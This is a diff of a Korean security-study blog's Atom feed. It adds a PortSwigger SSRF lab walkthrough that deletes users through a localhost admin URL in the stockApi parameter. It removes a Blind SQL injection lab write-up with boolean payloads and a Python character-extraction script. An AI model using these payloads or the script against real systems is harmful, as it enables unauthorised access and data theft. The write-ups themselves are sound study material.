@@ -1,4 +1,71 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-27T02:02:18+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IEFQSeyjvOyGjOqwgCDri7TquLQg7Y6Y7J207KeAIOyalOyyrVxu7ISc67KEIC0-PiBBUEkg7ISc67KEIDog642w7J207YSwIOyalOyyrVxuQVBJIOyEnOuyhCAtPj4g7ISc67KEIDog642w7J207YSwIOydkeuLtVxu7ISc67KEIC0-PiDshJzrsoQgOiDtjpjsnbTsp4Ag66CM642U66eBXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">CSRF 와 SSRF</title><link href="http://localhost:4000/CSRF%EC%99%80SSRF/" rel="alternate" type="text/html" title="CSRF 와 SSRF" /><published>2023-05-26T00:00:00+09:00</published><updated>2021-05-26T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EC%99%80SSRF</id><content type="html" xml:base="http://localhost:4000/CSRF%EC%99%80SSRF/"><![CDATA[<h2 id="csrf-공격">CSRF 공격</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-05-27T02:24:38+09:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">기록하는 개발자</title><subtitle>기록소</subtitle><author><name>Jung MinGyu</name></author><entry><title type="html">그래프 그리기 위한것</title><link href="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/" rel="alternate" type="text/html" title="그래프 그리기 위한것" /><published>2099-09-09T00:00:00+09:00</published><updated>2099-12-31T23:13:00+09:00</updated><id>http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC</id><content type="html" xml:base="http://localhost:4000/%EB%AA%A8%EC%9D%98%ED%95%B4%ED%82%B9%EC%88%98%EC%97%85/%EC%98%A4%EC%A7%81%EB%A1%9C%EC%BB%AC/"><![CDATA[<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>]]></content><author><name>Jung MinGyu</name></author><category term="모의해킹수업" /><category term="웹 구조" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">SSRF 실습 문제</title><link href="http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF/" rel="alternate" type="text/html" title="SSRF 실습 문제" /><published>2023-05-27T00:00:00+09:00</published><updated>2023-05-27T23:13:00+09:00</updated><id>http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF</id><content type="html" xml:base="http://localhost:4000/SSRF%EC%8B%A4%EC%8A%B5%EB%AC%B8%EC%A0%9CBasicSSRF/"><![CDATA[<h2 id="ssrf-란">SSRF 란?</h2>
+<ul>
+  <li>서버가 임의의 요청을 보내도록 하는 공격이다.</li>
+</ul>
+
+<h2 id="ssrf-문제">SSRF 문제</h2>
+<ul>
+  <li><a href="https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost">Lab: Basic SSRF against the local server Web Security Academy</a></li>
+</ul>
+
+<h2 id="문제-내용">문제 내용</h2>
+<ul>
+  <li>수량 체크를 하기위해 내부 시스템으로 부터 데이터를 가지고온다.</li>
+  <li>문제를 해결하기 위해서는 <code class="language-plaintext highlighter-rouge">http://localhost/admin</code> 에 접근하여 <code class="language-plaintext highlighter-rouge">carlos</code> 유저를 삭제해야 한다.</li>
+</ul>
+
+<p><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9b364c73-85b0-4f2a-a73e-5631530108f2" alt="Pasted image 20230527001755" /></p>
+
+<h2 id="문제-풀이">문제 풀이</h2>
+
+<h3 id="사이트-분석-및-취약점-찾기">사이트 분석 및 취약점 찾기</h3>
+
+<h4 id="상품-수량-체크부분">상품 수량 체크부분</h4>
+<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7sgqzsmqnsnpAgLT4-IOyEnOuyhCA6IOygleyDgeyggSDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrp4Htgazrpbwg7Ya17ZW0IOuCtOu2gCDtjpjsnbTsp4Ag7IiY65-JIOyalOyyrS5cbuuCtOu2gCDshJzrsoQgLT4-IOyEnOuyhCA6IOyImOufiSDsnZHri7UuXG7shJzrsoQgLT4-IOyCrOyaqeyekCA6IOyImOufiSDsnZHri7UuIiwibWVybWFpZCI6bnVsbH0" /></p>
+<ul>
+  <li>
+    <p>상품 수량 체크부분 POST요청의 파라미터로 URL을 넣어 요청을 보낸다. 즉 이 부분에서 SSRF 공격을 시도할 수 있다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f524fe2c-5897-4609-99d4-13cf520f00af" alt="Pasted image 20230527005245" />
+<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/4b5fcdad-9c15-4476-ba8a-6d15e871f04a" alt="Pasted image 20230527004914" />
+<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/f6958d20-01a0-4146-85f3-10fa5ac1d1cc" alt="Pasted image 20230527005001" /></p>
+  </li>
+  <li>
+    <p>오직 POST 요청으로만 수량을 체크할 수 있다. GET 요청을 보냈을 때 수량을 체크할 수가 없다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8c0aa1bc-d813-4ffd-a0c0-278bb16187e6" alt="Pasted image 20230527005515" /></p>
+  </li>
+</ul>
+
+<h4 id="admin-페이지-접속-시도">admin 페이지 접속 시도</h4>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">https://문제 주소/admin</code> 을 통해 바로 접속을 시도해 보았다. 하지만 admin 페이지에 접속하기 위해서는 <code class="language-plaintext highlighter-rouge">administrator</code>로 로그인 하거나 내부에서 접속해야 한다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/0656feeb-8612-43ea-9104-5834bc6fa8de" alt="Pasted image 20230527005910" /></li>
+</ul>
+
+<h3 id="공격-시나리오">공격 시나리오</h3>
+<p><img class="mermaid" src="https://mermaid.ink/svg/eyJjb2RlIjoic2VxdWVuY2VEaWFncmFtXG7qs7XqsqnsnpAgLT4-IOyEnOuyhCA6IOu5hOygleyDgSDtjpjsnbTsp4Ag7YyM652866-47YSw66W8IOuEo-ydgCDsiJjrn4kg7JqU7LKtXG7shJzrsoQgLT4-IOuCtOu2gCDshJzrsoQgOiDrgrTrtoAg7Y6Y7J207KeAIOyalOyyrVxu64K067aAIOyEnOuyhCAtPj4g7ISc67KEIDog64K067aAIO2OmOydtOyngCDsnZHri7VcbuyEnOuyhCAtPj4g6rO16rKp7J6QIDog64K067aAIO2OmOydtOyngCDsnZHri7UiLCJtZXJtYWlkIjpudWxsfQ" /></p>
+<ol>
+  <li>서버로 수량 체크 요청을 보낼 때 수량을 체크하기 위한 링크가 아닌 서버 내부 페이지 URL를 파라미터에 넣어 요청을 보낸다.</li>
+  <li>서버에서 파라미터에 들어있는 URL주소로 요청을 보낸다.</li>
+  <li>서버는 URL주소 응답을 받는다.</li>
+  <li>서버는 공격자에게 URL 페이지 응답을 그대로 사용자에게 보내준다.</li>
+</ol>
+
+<h3 id="admin-페이지-접속-공격">admin 페이지 접속 공격</h3>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">stockApi</code> 파라미터에 <code class="language-plaintext highlighter-rouge">http://localhost/admin</code> 주소를 입력해 준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d9bd18c0-c348-452a-9461-5b447cea2613" alt="Pasted image 20230527013431" /></li>
+  <li>Post 요청을 보내면 <code class="language-plaintext highlighter-rouge">http://localhost/admin</code> 페이지가 나타난다. 이 페이지는 서버 내부에서 접속된 페이지이다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/78ea87bd-3af3-49f8-901f-ef992bb0e96b" alt="Pasted image 20230527013531" /></li>
+  <li>admin 페이지 접속에 성공하였다. 이제 <code class="language-plaintext highlighter-rouge">carlos</code> 유저를 삭제하면 된다. 즉 위의 사진에서 보이듯 <code class="language-plaintext highlighter-rouge">Delete</code>  링크를 눌러줘야한다. 하지만 바로 누르면 외부에서 요청한 것이라 동작을 안한다. 따라서 파라미터에 <code class="language-plaintext highlighter-rouge">Delete링크</code>를 넣어 요청을 보내주면 된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/8c857d16-ae1a-43b1-9554-d6a120b4857b" alt="Pasted image 20230527014116" /></li>
+</ol>
+
+<h3 id="유저-삭제하기">유저 삭제하기</h3>
+<ol>
+  <li><code class="language-plaintext highlighter-rouge">stockApi</code> 파라미터에 <code class="language-plaintext highlighter-rouge">http://localhost/admin/delete?username=wiener</code> 링크를 입력해 준다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9a578c2c-cf4c-4a87-84b6-b1ac926dce87" alt="Pasted image 20230527014517" /></li>
+  <li>Post 요청을 보내면 성공적으로 <code class="language-plaintext highlighter-rouge">wiener</code> 유저가 삭제되었다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/7fedaef1-78ee-4b7a-9688-272fa5f7a01b" alt="Pasted image 20230527014556" /></li>
+  <li>목표는 <code class="language-plaintext highlighter-rouge">carlos</code> 유저를 삭제하는 것이다. 따라서 <code class="language-plaintext highlighter-rouge">carlos</code> 를 링크에 넣어주자. 그러면 <code class="language-plaintext highlighter-rouge">stockApi</code> 파라미터에는 <code class="language-plaintext highlighter-rouge">http://localhost/admin/delete?username=carlos</code> 가 들어가게 된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/9061f31e-2a9a-4dc0-b986-1b01007c2a51" alt="Pasted image 20230527015033" /></li>
+  <li>Post 요청을 보내면 목표였던  <code class="language-plaintext highlighter-rouge">carlos</code> 유저가 삭제된다.<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/d34a3ef7-cc64-4595-b6a3-05f7e26bb06a" alt="Pasted image 20230527015153" /></li>
+</ol>
+
+<h2 id="후기">후기</h2>
+<ul>
+  <li>직접 스터디에서 풀이해 주었지만 직접 SSRF 문제를 풀어보니 파라미터로 URL을 입력받는 것이 얼마나 위험한지 알 수 있었다. SSRF 취약점을 이용하면 외부에서 접근이 불가능한 내부 페이지에 접속을 직접 확인할 수 있어 재밌었다.</li>
+</ul>]]></content><author><name>Jung MinGyu</name></author><category term="SSRF" /><category term="웹 해킹" /><summary type="html"><![CDATA[오직 로컬에서만 되냐 젠장]]></summary></entry><entry><title type="html">CSRF 와 SSRF</title><link href="http://localhost:4000/CSRF%EC%99%80SSRF/" rel="alternate" type="text/html" title="CSRF 와 SSRF" /><published>2023-05-26T00:00:00+09:00</published><updated>2021-05-26T23:13:00+09:00</updated><id>http://localhost:4000/CSRF%EC%99%80SSRF</id><content type="html" xml:base="http://localhost:4000/CSRF%EC%99%80SSRF/"><![CDATA[<h2 id="csrf-공격">CSRF 공격</h2>
 
 <h3 id="설명">설명</h3>
 <ul>
@@ -1966,293 +2033,4 @@ step 3. <strong>Black List</strong> 기반으로 Event Handler를 필터링 하�
 <ul>
   <li><a href="https://github.com/MinGyu2/MyHomePage">MinGyu2/MyHomePage (github.com)</a></li>
   <li><a href="https://github.com/MinGyu2/myWeb">MinGyu2/myWeb (github.com)</a></li>
-</ul>]]></content><author><name>Jung MinGyu</name></author><category term="웹" /><category term="jsp" /><category term="servlet" /><summary type="html"><![CDATA[게시글에 페이징 번호를 추가하자.]]></summary></entry><entry><title type="html">Blind SQL Injection 실습</title><link href="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/" rel="alternate" type="text/html" title="Blind SQL Injection 실습" /><published>2023-05-12T00:00:00+09:00</published><updated>2023-05-12T23:13:00+09:00</updated><id>http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5</id><content type="html" xml:base="http://localhost:4000/BlindSQLi%EC%8B%A4%EC%8A%B5/"><![CDATA[<h2 id="실습-환경">실습 환경</h2>
-<ul>
-  <li>오라클 DB</li>
-</ul>
-
-<h2 id="서버-인증-질의문-예측하기">서버 인증 질의문 예측하기</h2>
-
-<ul>
-  <li>인증과 식별을 따로 분리하여 검사한다.</li>
-</ul>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="n">id</span><span class="p">,</span><span class="n">pwd</span> <span class="k">from</span> <span class="n">xxx</span> <span class="k">where</span> <span class="n">id</span><span class="o">=</span><span class="s1">'xx'</span><span class="p">;</span>
-</code></pre></div></div>
-
-<h2 id="참과-거짓-화면">참과 거짓 화면</h2>
-<ul>
-  <li>로그인 성공 실패 여부로 참과 거짓을 구분할 수 있다.</li>
-</ul>
-
-<h3 id="참">참</h3>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-</code></pre></div></div>
-
-<ul>
-  <li>로그인 성공<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/57c7f54d-5fef-454e-9060-047ac800766a" alt="Pasted image 20230511135315" /></li>
-</ul>
-
-<h3 id="거짓">거짓</h3>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">(</span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-</code></pre></div></div>
-
-<ul>
-  <li>로그인 실패<br /><img src="https://github.com/MinGyu2/MinGyu2.github.io/assets/31990118/310a130f-2f28-444b-b75d-3692cc977cfd" alt="Pasted image 20230511135242" /></li>
-</ul>
-
-<h2 id="select-문-사용-가능-확인">select 문 사용 가능 확인</h2>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="s1">'test'</span><span class="p">)</span><span class="o">=</span><span class="s1">'test'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-<span class="err">성공</span>
-
-<span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span>
-<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">)</span><span class="o">=</span><span class="s1">'test'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-<span class="err">성공</span>
-</code></pre></div></div>
-
-<ul>
-  <li>로그인 성공. select 문을 사용할 수 있다.</li>
-</ul>
-
-<h2 id="공격-포맷-만들기">공격 포맷 만들기.</h2>
-<ul>
-  <li>Blind SQL Injection 은 한 문자씩 확인하는 공격이다.</li>
-  <li>ascii 와 substr 함수를 이용할 것 이다.</li>
-</ul>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="s1">'t'</span><span class="p">)</span><span class="o">=</span><span class="s1">'t'</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-<span class="err">성공</span>
-
-<span class="n">ascii</span> <span class="err">함수를</span> <span class="err">문자를</span> <span class="err">이용하여</span> <span class="err">아스키코드로</span> <span class="err">변환한다</span><span class="p">.</span>
-<span class="n">ascii</span><span class="p">(</span><span class="s1">'t'</span><span class="p">)</span>
-<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="s1">'t'</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-<span class="err">성공</span>
-
-<span class="s1">'t'</span> <span class="err">한</span> <span class="err">문자</span> <span class="err">추출하기</span><span class="p">.</span>
-<span class="n">substr</span><span class="p">(</span><span class="s1">'test'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span>
-<span class="err">입력</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="s1">'test'</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-<span class="err">성공</span>
-
-<span class="err">공격문</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">SQL</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-
-<span class="s1">'test'</span> <span class="err">출력하기</span><span class="p">.</span>
-<span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">;</span>
-<span class="err">공격문</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">select</span> <span class="s1">'test'</span> <span class="k">from</span> <span class="n">dual</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-<span class="err">성공</span>
-</code></pre></div></div>
-
-<ul>
-  <li>완성된 공격 포맷</li>
-</ul>
-
-<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">공격</span> <span class="err">포맷</span> <span class="o">=</span> <span class="s1">' user2'</span> <span class="k">and</span> <span class="p">((</span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">((</span><span class="k">SQL</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="k">and</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1 '</span>
-</code></pre></div></div>
-
-<h2 id="base가-되는-파이썬-코드">Base가 되는 파이썬 코드</h2>
-<ul>
-  <li>인자로 쿼리문을 삽입해 주면 된다.</li>
-</ul>
-
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">FAIL_LEN</span> <span class="o">=</span> <span class="mi">1482</span><span class="p">;</span>
-<span class="n">URL</span> <span class="o">=</span> <span class="s">"http://221.27.0.6/main_page/sql_injection_prob/login_methods/division_blind_sql_injection/authentication"</span>
-<span class="n">COOKIES</span> <span class="o">=</span> <span class="p">{</span><span class="s">'JSESSIONID'</span><span class="p">:</span><span class="s">'E092AC001C0A642C200BD6902B7EF6A5'</span><span class="p">}</span>
-<span class="n">DATA</span><span class="o">=</span><span class="p">{</span><span class="s">'user_name'</span><span class="p">:</span><span class="s">'user2'</span><span class="p">,</span> <span class="s">'user_password'</span><span class="p">:</span><span class="s">'2222'</span><span class="p">}</span>
-
-<span class="k">def</span> <span class="nf">is_success</span><span class="p">()</span><span class="o">-&gt;</span><span class="nb">bool</span><span class="p">:</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">URL</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span> <span class="n">COOKIES</span><span class="p">,</span><span class="n">data</span><span class="o">=</span> <span class="n">DATA</span><span class="p">)</span>
-<span class="err"> </span> <span class="err"> </span> <span class="k">return</span> <span class="nf">len</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span> <span class="o">!=</span> <span class="n">FAIL_LEN</span><span class="p">;</span>
-  
-<span class="k">def</span> <span class="nf">find_data</span><span class="p">(</span><span class="n">query</span><span class="p">):</span>
-<span class="err"> </span> <span class="err"> </span> <span class="n">row</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
-</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="ow">not</span> <span class="nf">is_success</span><span class="p">()</span> <span class="p">:</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="p">;</span>
-  
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">point</span> <span class="o">=</span> <span class="mi">1</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
-</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="n">point</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="ow">not</span> <span class="nf">is_success</span><span class="p">():</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">break</span><span class="p">;</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1"># 이분 탐색
-</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">s</span> <span class="o">=</span> <span class="mi">32</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="mi">126</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">while</span> <span class="n">s</span> <span class="o">&lt;</span> <span class="n">e</span><span class="p">:</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">m</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="n">e</span><span class="p">)</span><span class="o">//</span><span class="mi">2</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">DATA</span><span class="p">[</span><span class="s">'user_name'</span><span class="p">]</span> <span class="o">=</span> <span class="nf">attack_query</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">row</span><span class="p">,</span><span class="n">point</span><span class="p">,</span><span class="n">m</span><span class="p">)</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">if</span> <span class="nf">is_success</span><span class="p">()</span> <span class="p">:</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">s</span> <span class="o">=</span> <span class="n">m</span><span class="o">+</span><span class="mi">1</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="k">else</span><span class="p">:</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">e</span> <span class="o">=</span> <span class="n">m</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
-</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">(</span><span class="nf">chr</span><span class="p">(</span><span class="n">s</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">,</span><span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">point</span> <span class="o">+=</span><span class="mi">1</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="nf">print</span><span class="p">()</span>
-<span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="c1">#
-</span><span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="err"> </span> <span class="n">row</span><span class="o">+=</span><span class="mi">1</span>
-<span class="err"> </span> <span class="err"> </span> <span class="k">return</span>
-<span class="c1"># sql 질의문
-# row 0 부터 시작
-# point 1 부터 시작
-# ascii
